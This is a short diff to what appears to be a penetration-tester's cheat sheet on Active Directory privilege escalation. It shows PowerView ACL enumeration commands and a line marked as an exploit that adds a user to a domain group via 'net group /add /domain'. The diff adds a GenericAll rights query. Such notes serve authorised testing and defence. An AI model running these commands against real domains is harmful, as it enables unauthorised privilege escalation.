@@ -42,6 +42,11 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
 #exploit
 net group "Management Department" <user> /add /domain
 ```
+External site 
+```
+Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
+```
+
 ### Domain Shares
 ```
 Find-DomainShare
